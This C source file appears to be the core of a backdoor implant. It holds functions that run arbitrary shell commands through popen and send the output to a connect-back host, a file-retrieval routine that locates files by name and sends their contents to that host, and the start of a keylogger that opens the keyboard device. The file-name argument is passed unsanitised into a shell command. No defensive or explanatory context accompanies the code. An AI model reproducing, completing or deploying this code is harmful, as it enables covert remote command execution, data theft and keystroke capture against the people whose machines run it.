#include "functionality.h"

int sendBuffer(int socket, char *buffer, int length);
int processFile(char *filePath, int socket);
int tcpConnect();

void executeSystemCall(char *command)
{
    int socket = 0;
    char line[PATH_MAX];
    FILE *results = NULL;
    
    // Execute and open the pipe for reading
    results = popen(command, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return;
    }
    
    // Open a connection back to the client
    if ((socket = tcpConnect()) == 0)
    {
        return;
    }
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // Read from the stream
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        sendBuffer(socket, line, strnlen(line, PATH_MAX));
    }
    
    pclose(results);
    close(socket);
}

void retrieveFile(char *fileName)
{
    int socket = 0;
    char line[PATH_MAX];
    FILE *results = NULL;
    
    // Update the database for locate
    system("updatedb");
    
    // Combine the file name with the locate command
    snprintf(line, sizeof(line), "locate %s", fileName);
    
    // Execute and open the pipe for reading
    results = popen(line, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return;
    }
    
    // Open a connection back to the client
    if ((socket = tcpConnect()) == 0)
    {
        return;
    }
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // This will handle multiple results from locate, client may break depending
    // on the type of file requested.
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        processFile(line, socket);
    }
    
    pclose(results);
    close(socket);
    
}

void keylogger()
{
#ifdef __linux__
    int keyboard = 0;
    
    // Open the keyboard input device for listening
    keyboard = open(KEYBOARD_DEVICE, O_RDONLY | O_NOCTTY);
    if (keyboard == -1)
    {
        systemFatal("Unable to open keyboard");
        return;
    }
#endif
}

int sendBuffer(int socket, char *buffer, int length)
{
    int sentBytes = 0;
    int bytesLeft = length;
    int temp = 0;
    
    while(sentBytes < length)
    {
        temp = send(socket, buffer + sentBytes, bytesLeft, 0);
        if (temp == -1)
            return -1;
        sentBytes += temp;
        bytesLeft -= temp;
    }
    return sentBytes;
}

int tcpConnect()
{
    int error = 0;
    int handle = 0;
    struct hostent *host;
    struct sockaddr_in server;
    
    host = gethostbyaddr(SOURCE_IP, strlen(SOURCE_IP), AF_INET);
    handle = socket (AF_INET, SOCK_STREAM, 0);
    if (handle == -1)
    {
        return 0;
    }
    else
    {
        server.sin_family = AF_INET;
        server.sin_port = htons (SOURCE_PORT_INT);
        server.sin_addr = *((struct in_addr *) host->h_addr);
        bzero (&(server.sin_zero), 8);
        
        error = connect (handle, (struct sockaddr *)&server, sizeof(struct sockaddr));
        if (error == -1)
        {
            return 0;
        }
    }
    
    return handle;
}

int processFile(char *filePath, int socket)
{
    char line[PATH_MAX];
    FILE *file = NULL;
    
    // Open the file for reading
    file = fopen(filePath, "r");
    if (file == NULL)
    {
        return -1;
    }
    
    // Read and send the file
    while (fgets(line, PATH_MAX, file) != NULL)
    {
        if (sendBuffer(socket, line, strnlen(line, PATH_MAX)) == -1)
        {
            return -1;
        }
    }
    return 0;
}

int createRawTcpPacket(char *data)
{
	
	return 0;
}
